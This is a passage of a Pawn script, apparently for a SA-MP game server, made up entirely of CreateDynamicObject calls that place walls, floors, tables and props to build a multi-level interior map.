	CreateDynamicObject(2637, 1579.50000, -1661.50000, 1100.50000,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(2637, 1583.06970, -1683.59998, 1100.47998,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(2637, 1579.50000, -1657.84998, 1100.50000,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(2637, 1582.69995, -1661.50000, 1100.50000,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(2637, 1579.50000, -1654.00000, 1100.50000,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(2637, 1582.69995, -1657.84998, 1100.50000,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(2637, 1585.69995, -1661.50000, 1100.50000,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(2637, 1582.69995, -1654.00000, 1100.50000,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(2637, 1585.69995, -1657.84998, 1100.50000,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(2637, 1588.84998, -1661.50000, 1100.50000,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(2637, 1585.69995, -1654.00000, 1100.50000,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(2637, 1588.84998, -1657.84998, 1100.50000,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(2637, 1592.09998, -1661.50000, 1100.50000,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(2637, 1588.84998, -1654.00000, 1100.50000,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(2637, 1592.09998, -1657.84998, 1100.50000,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(2637, 1592.09998, -1654.00000, 1100.50000,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(2684, 1569.04004, -1674.63794, 1101.43994,   -90.00000, 0.00000, 20.00000);
	CreateDynamicObject(2684, 1569.04004, -1676.51428, 1101.43994,   -90.00000, 0.00000, -80.00000);
	CreateDynamicObject(2684, 1569.03479, -1677.02307, 1101.43994,   -90.00000, 0.00000, -40.00000);
	CreateDynamicObject(2684, 1569.06995, -1674.22827, 1101.43994,   -90.00000, 0.00000, 80.00000);
	CreateDynamicObject(2684, 1584.11438, -1668.37927, 1100.90100,   -90.00000, 0.00000, -50.00000);
	CreateDynamicObject(2684, 1584.24646, -1668.76819, 1100.90100,   -90.00000, 0.00000, 50.00000);
	CreateDynamicObject(2684, 1602.67004, -1688.76001, 1107.92004,   -90.00000, 0.00000, 10.00000);
	CreateDynamicObject(2684, 1602.95996, -1688.40002, 1107.92004,   -90.00000, 0.00000, 120.00000);
	CreateDynamicObject(2684, 1603.11279, -1698.61987, 1107.92004,   -90.00000, 0.00000, 120.00000);
	CreateDynamicObject(2684, 1601.98450, -1707.60449, 1107.89502,   -90.00000, 0.00000, 0.00000);
	CreateDynamicObject(2684, 1602.42297, -1707.67310, 1107.89502,   -90.00000, 0.00000, 60.00000);
	CreateDynamicObject(2685, 1555.83496, -1693.15002, 1101.59998,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(2687, 1556.09998, -1693.15002, 1101.69995,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(2690, 1556.30005, -1683.17004, 1100.43005,   0.00000, 0.00000, 125.00000);
	CreateDynamicObject(2690, 1556.30005, -1667.93005, 1100.43005,   0.00000, 0.00000, 50.00000);
	CreateDynamicObject(2699, 1563.52002, -1658.15002, 1100.68506,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2699, 1568.15002, -1658.15002, 1100.68506,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2712, 1546.61804, -1693.69995, 1100.67004,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(2725, 1599.21997, -1712.00000, 1107.50000,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2737, 1565.69995, -1683.34998, 1101.93005,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(2737, 1565.69995, -1667.73999, 1101.93005,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2737, 1586.65002, -1683.14001, 1101.73804,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(2764, 1557.69995, -1662.50000, 1100.47998,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2764, 1557.69995, -1661.44995, 1100.47998,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2764, 1557.69995, -1660.40002, 1100.47998,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2764, 1557.69995, -1659.34998, 1100.47998,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2764, 1570.19995, -1662.50000, 1100.47998,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2764, 1570.19995, -1661.44995, 1100.47998,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2764, 1570.19995, -1660.40002, 1100.47998,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2764, 1570.19995, -1659.34998, 1100.47998,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2788, 1557.69995, -1663.80005, 1100.59998,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(2788, 1556.40002, -1662.50000, 1100.59998,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(2788, 1559.05798, -1662.50000, 1100.59998,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2788, 1556.40002, -1661.40002, 1100.59998,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(2788, 1559.06873, -1661.40002, 1100.59998,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2788, 1556.40002, -1660.30005, 1100.59998,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(2788, 1559.07947, -1660.30005, 1100.59998,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2788, 1556.40002, -1659.30005, 1100.59998,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(2788, 1559.09021, -1659.30005, 1100.59998,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2788, 1557.69995, -1658.00000, 1100.59998,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(2788, 1568.80005, -1662.50000, 1100.59998,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(2788, 1570.19995, -1663.80005, 1100.59998,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(2788, 1568.80005, -1661.40002, 1100.59998,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(2788, 1568.80005, -1660.30005, 1100.59998,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(2788, 1571.69995, -1662.50000, 1100.59998,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2788, 1568.80005, -1659.30005, 1100.59998,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(2788, 1571.69995, -1661.40002, 1100.59998,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2788, 1571.69995, -1660.30005, 1100.59998,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2788, 1571.69995, -1659.30005, 1100.59998,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2788, 1570.19995, -1658.00000, 1100.59998,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(2816, 1558.30554, -1679.89685, 1100.57520,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2819, 1561.16492, -1693.81738, 1100.68005,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(2819, 1569.22095, -1691.80908, 1100.68005,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(2824, 1576.01208, -1693.88293, 1100.88818,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(2824, 1582.33813, -1694.75500, 1100.88818,   0.00000, 0.00000, -20.00000);
	CreateDynamicObject(2824, 1598.67041, -1695.77002, 1107.58398,   0.00000, 0.00000, 200.00000);
	CreateDynamicObject(2826, 1558.32544, -1671.20142, 1100.57410,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2828, 1602.80005, -1688.19995, 1107.89502,   0.00000, 0.00000, 210.00000);
	CreateDynamicObject(2894, 1570.54321, -1671.42053, 1100.87805,   0.00000, 0.00000, -20.00000);
	CreateDynamicObject(2894, 1574.83789, -1657.66504, 1101.24121,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(2894, 1579.66089, -1661.53711, 1100.92542,   0.00000, 0.00000, 95.00000);
	CreateDynamicObject(2894, 1582.82324, -1683.41687, 1100.90540,   0.00000, 0.00000, -120.00000);
	CreateDynamicObject(2894, 1579.65210, -1658.38818, 1100.92542,   0.00000, 0.00000, 110.00000);
	CreateDynamicObject(2894, 1578.23535, -1694.96082, 1100.88831,   0.00000, 0.00000, 20.00000);
	CreateDynamicObject(2894, 1579.73865, -1657.26587, 1100.92542,   0.00000, 0.00000, 95.00000);
	CreateDynamicObject(2894, 1579.72437, -1654.60583, 1100.92542,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(2894, 1583.01233, -1658.33826, 1100.92542,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(2894, 1582.42212, -1693.88916, 1100.88831,   0.00000, 0.00000, -150.00000);
	CreateDynamicObject(2894, 1582.73438, -1657.28101, 1100.92542,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(2894, 1579.65100, -1653.49109, 1100.92542,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(2894, 1585.94897, -1662.01855, 1100.92542,   0.00000, 0.00000, 95.00000);
	CreateDynamicObject(2894, 1585.96265, -1660.97241, 1100.92542,   0.00000, 0.00000, 95.00000);
	CreateDynamicObject(2894, 1582.75952, -1653.55273, 1100.92542,   0.00000, 0.00000, 110.00000);
	CreateDynamicObject(2894, 1585.93445, -1657.84558, 1100.92542,   0.00000, 0.00000, 95.00000);
	CreateDynamicObject(2894, 1588.76001, -1666.17004, 1090.40198,   0.00000, 0.00000, -190.00000);
	CreateDynamicObject(2894, 1585.85840, -1654.05811, 1100.92542,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(2894, 1592.25159, -1661.42175, 1100.92542,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(2894, 1589.05005, -1654.60559, 1100.92542,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(2894, 1589.10632, -1653.35864, 1100.92542,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(2894, 1603.06995, -1688.94995, 1107.89819,   0.00000, 0.00000, 80.00000);
	CreateDynamicObject(2913, 1545.95996, -1699.44495, 1101.05005,   0.00000, 90.00000, 90.00000);
	CreateDynamicObject(2915, 1547.43640, -1695.33228, 1100.26001,   0.00000, 0.00000, -50.00000);
	CreateDynamicObject(2915, 1547.99646, -1695.82776, 1100.26001,   0.00000, 0.00000, 50.00000);
	CreateDynamicObject(2922, 1559.80005, -1667.69995, 1101.65002,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(2922, 1559.77002, -1667.53503, 1101.65002,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2922, 1561.90002, -1683.41003, 1101.65002,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2922, 1561.92505, -1683.56006, 1101.65002,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(2922, 1572.50000, -1664.31995, 1101.65002,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(2922, 1572.47998, -1664.17505, 1101.65002,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2922, 1579.02002, -1680.80005, 1101.65002,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(2922, 1579.17004, -1680.76001, 1101.65002,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(2924, 1574.00000, -1680.00000, 1108.28003,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(2949, 1579.97998, -1666.19995, 1089.58716,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(2953, 1580.38635, -1695.10156, 1100.88904,   0.00000, 0.00000, -40.00000);
	CreateDynamicObject(2953, 1603.15002, -1698.34998, 1107.89856,   0.00000, 0.00000, 100.00000);
	CreateDynamicObject(3071, 1546.51880, -1695.90173, 1100.33997,   0.00000, 90.00000, 20.00000);
	CreateDynamicObject(3077, 1572.19995, -1657.84998, 1104.34998,   0.00000, 180.00000, 90.00000);
	CreateDynamicObject(3088, 1572.16504, -1657.80005, 1100.50000,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(3089, 1563.33203, -1664.25000, 1101.19995,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(3089, 1563.33301, -1686.86499, 1101.19995,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(3089, 1575.42004, -1676.27502, 1101.19995,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(11631, 1587.59998, -1686.69995, 1101.30005,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(14401, 1560.61182, -1693.19995, 1100.34998,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(14401, 1567.30005, -1693.19995, 1100.34998,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(14407, 1588.90002, -1673.43262, 1096.90002,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(14407, 1593.50000, -1677.56836, 1103.00000,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(14407, 1593.98999, -1669.34998, 1090.59998,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(14407, 1596.50000, -1681.59998, 1103.90002,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(14438, 1558.50000, -1675.50000, 1105.40002,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(14438, 1560.00000, -1658.50000, 1105.40002,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(14438, 1560.00000, -1693.15002, 1105.40002,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(14438, 1547.30005, -1705.50000, 1105.40002,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(14438, 1584.00000, -1658.00000, 1105.40002,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(14439, 1581.44995, -1691.94995, 1112.30005,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(14455, 1574.02795, -1701.15002, 1108.74500,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(14455, 1588.72498, -1705.50000, 1108.74500,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(14455, 1594.90002, -1708.90002, 1108.74500,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(14532, 1579.72998, -1686.22998, 1101.06006,   0.00000, 0.00000, -45.00000);
	CreateDynamicObject(14532, 1574.95825, -1654.86365, 1101.54004,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(14532, 1581.55005, -1691.50000, 1108.07495,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(14532, 1587.25000, -1685.15002, 1101.06006,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(14842, 1549.27002, -1687.86499, 1101.80005,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(14842, 1547.21997, -1688.00000, 1101.80005,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(16779, 1599.00000, -1688.17737, 1110.50000,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(16779, 1599.00000, -1698.14771, 1110.50000,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(16779, 1599.27466, -1707.58203, 1110.50000,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(18866, 1578.84802, -1693.98523, 1100.88855,   0.00000, 0.00000, 150.00000);
	CreateDynamicObject(18866, 1588.85730, -1666.58508, 1090.40173,   0.00000, 0.00000, 150.00000);
	CreateDynamicObject(18868, 1603.25244, -1688.29858, 1107.89807,   0.00000, 0.00000, 50.00000);
	CreateDynamicObject(18868, 1603.15015, -1697.75598, 1107.89807,   0.00000, 0.00000, 50.00000);
	CreateDynamicObject(18868, 1602.84961, -1708.31921, 1107.87244,   0.00000, 0.00000, 120.00000);
	CreateDynamicObject(19100, 1602.03162, -1706.53064, 1107.93506,   -3.00000, -86.50000, 95.00000);
	CreateDynamicObject(19138, 1602.60828, -1697.70825, 1107.93005,   0.00000, 0.00000, 120.00000);
	CreateDynamicObject(19161, 1556.94397, -1698.59998, 1101.23804,   -90.00000, -90.00000, 0.00000);
	CreateDynamicObject(19162, 1557.19995, -1698.84998, 1101.59497,   -90.00000, 0.00000, 0.00000);
	CreateDynamicObject(19171, 1558.00000, -1667.69995, 1102.16003,   0.00000, 90.00000, -90.00000);
	CreateDynamicObject(19172, 1558.07996, -1683.40002, 1102.15002,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(19174, 1581.50000, -1708.43005, 1109.50000,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(19302, 1585.50000, -1676.01294, 1090.83496,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(19302, 1585.50000, -1674.08997, 1090.83496,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19302, 1585.50000, -1677.76001, 1090.83496,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19302, 1585.50000, -1672.33997, 1090.83496,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(19302, 1585.50000, -1679.68799, 1090.83496,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(19302, 1585.50000, -1681.43506, 1090.83496,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19302, 1585.50000, -1683.35999, 1090.83496,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(19302, 1585.50000, -1685.10999, 1090.83496,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19302, 1585.50000, -1687.04004, 1090.83496,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(19302, 1585.50000, -1688.79004, 1090.83496,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19302, 1588.70996, -1671.34998, 1090.83496,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(19304, 1585.50000, -1676.88306, 1092.70605,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19304, 1585.50000, -1673.20996, 1092.70605,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19304, 1585.50000, -1680.56006, 1092.70605,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19304, 1585.50000, -1684.23499, 1092.70605,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19304, 1585.50000, -1687.91296, 1092.70605,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19304, 1587.83496, -1671.34998, 1092.70605,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19347, 1568.91003, -1675.50000, 1102.35999,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19358, 1557.67505, -1683.48096, 1101.82996,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19358, 1557.67505, -1667.61804, 1101.82996,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19358, 1564.09497, -1683.48096, 1101.82996,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19358, 1564.09497, -1667.61804, 1101.82996,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19358, 1569.00000, -1681.96497, 1101.82996,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19358, 1569.00000, -1669.13501, 1101.82996,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19358, 1570.53003, -1680.27795, 1101.82996,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19358, 1570.53003, -1670.81995, 1101.82996,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19358, 1567.30505, -1664.25000, 1101.82996,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19358, 1567.30505, -1686.87000, 1101.82996,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19358, 1573.74194, -1680.27795, 1101.82996,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19358, 1573.74194, -1670.81995, 1101.82996,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19358, 1570.51501, -1664.25000, 1101.82996,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19358, 1570.51501, -1686.87000, 1101.82996,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19358, 1575.42102, -1678.76001, 1101.82996,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19358, 1575.42102, -1672.33997, 1101.82996,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19358, 1574.45996, -1683.67505, 1108.82996,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19358, 1544.65796, -1693.94104, 1101.82996,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19358, 1556.20996, -1651.56006, 1101.82996,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19358, 1579.09521, -1665.93994, 1101.82996,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19358, 1579.09521, -1685.17505, 1101.82996,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19358, 1580.79004, -1680.44849, 1101.82996,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19358, 1572.09998, -1652.92505, 1101.82996,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19358, 1572.09998, -1698.18994, 1101.82996,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19358, 1584.00000, -1680.44849, 1101.82996,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19358, 1586.77295, -1669.68005, 1101.82996,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19358, 1585.22998, -1686.87012, 1101.82996,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19358, 1586.77295, -1665.93994, 1101.82996,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19358, 1585.07996, -1689.40002, 1098.42297,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19358, 1585.07996, -1689.40002, 1105.13000,   0.00000, 180.00000, 90.00000);
	CreateDynamicObject(19358, 1586.77295, -1686.13000, 1101.82996,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19358, 1555.97998, -1707.62000, 1101.82996,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19358, 1587.30505, -1683.67505, 1108.82996,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19358, 1588.29004, -1687.82495, 1101.82996,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19358, 1544.65796, -1709.06201, 1101.82996,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19358, 1586.56494, -1699.50000, 1101.82996,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19358, 1593.19397, -1685.37000, 1108.82996,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19358, 1594.70996, -1679.62305, 1108.82996,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19358, 1594.70996, -1683.67505, 1105.32996,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19358, 1594.70996, -1683.67505, 1108.82996,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19358, 1593.19397, -1691.79004, 1108.82996,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19358, 1597.92004, -1675.48206, 1098.32996,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19358, 1597.92004, -1675.48206, 1105.32996,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19358, 1597.92004, -1675.48206, 1094.82996,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19358, 1597.92004, -1675.48206, 1108.82996,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19358, 1593.19397, -1695.00000, 1108.82996,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19358, 1597.92004, -1667.30005, 1098.32996,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19358, 1597.92004, -1683.67505, 1105.32996,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19358, 1597.92004, -1667.30005, 1094.82996,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19358, 1594.50806, -1652.92505, 1101.82996,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19358, 1593.19397, -1701.42004, 1108.82996,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19358, 1593.19397, -1707.83997, 1108.82996,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19358, 1604.51794, -1693.38000, 1108.82996,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19358, 1604.51794, -1703.01001, 1108.82996,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19377, 1560.46716, -1675.53723, 1103.59998,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19377, 1560.46716, -1685.17004, 1103.59998,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19377, 1560.46716, -1665.91003, 1103.59998,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19377, 1549.96802, -1685.17004, 1103.59998,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19377, 1570.96497, -1675.53723, 1103.59998,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19377, 1570.96497, -1685.17004, 1103.59998,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19377, 1570.96497, -1665.91003, 1103.59998,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19377, 1560.46716, -1694.80298, 1103.59998,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19377, 1560.46716, -1656.27698, 1103.59998,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19377, 1549.96802, -1694.80298, 1103.59998,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19377, 1570.96497, -1694.80298, 1103.59998,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19377, 1570.96497, -1656.27698, 1103.59998,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19377, 1581.46497, -1675.53723, 1103.59998,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19377, 1578.80005, -1684.52002, 1110.59998,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19377, 1581.46497, -1685.17004, 1103.59998,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19377, 1581.46497, -1665.91003, 1103.59998,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19377, 1584.50000, -1678.47498, 1093.13000,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19377, 1584.50000, -1668.84119, 1093.13000,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19377, 1549.96802, -1704.43005, 1103.59998,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19377, 1578.80005, -1694.15002, 1110.59998,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19377, 1586.62402, -1674.84998, 1108.93994,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19377, 1581.46497, -1694.80298, 1103.59998,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19377, 1581.46497, -1656.27698, 1103.59998,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19377, 1584.50000, -1688.09998, 1093.13000,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19377, 1589.80005, -1674.87634, 1108.88000,   0.00000, 70.00000, 0.00000);
	CreateDynamicObject(19377, 1591.30005, -1670.59998, 1100.96497,   0.00000, -60.00000, 0.00000);
	CreateDynamicObject(19377, 1589.30005, -1684.52002, 1110.59998,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19377, 1591.96497, -1684.53003, 1103.59998,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19377, 1591.96497, -1665.91003, 1103.59998,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19377, 1578.80005, -1703.78503, 1110.59998,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19377, 1589.30005, -1694.15002, 1110.59998,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19377, 1594.25000, -1666.47998, 1095.90002,   0.00000, 60.00000, 0.00000);
	CreateDynamicObject(19377, 1591.96497, -1656.27698, 1103.59998,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19377, 1589.30005, -1703.78503, 1110.59998,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19377, 1599.80005, -1678.94995, 1110.59998,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19377, 1601.25000, -1670.75244, 1097.30005,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19377, 1599.80005, -1688.57996, 1110.59998,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19377, 1599.80005, -1698.20996, 1110.59998,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19377, 1599.80005, -1707.83997, 1110.59998,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19379, 1560.46716, -1675.53723, 1100.00000,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19379, 1560.46716, -1685.17004, 1100.00000,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19379, 1560.46716, -1665.91003, 1100.00000,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19379, 1570.96497, -1675.53723, 1100.00000,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19379, 1570.96497, -1685.17004, 1100.00000,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19379, 1570.96497, -1665.91003, 1100.00000,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19379, 1560.46716, -1694.80298, 1100.00000,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19379, 1560.46716, -1656.27698, 1100.00000,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19379, 1549.96802, -1694.80298, 1100.00000,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19379, 1570.96497, -1694.80298, 1100.00000,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19379, 1570.96497, -1656.27698, 1100.00000,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19379, 1581.46497, -1675.53723, 1100.00000,   0.00000, 90.00000, 0.00000);
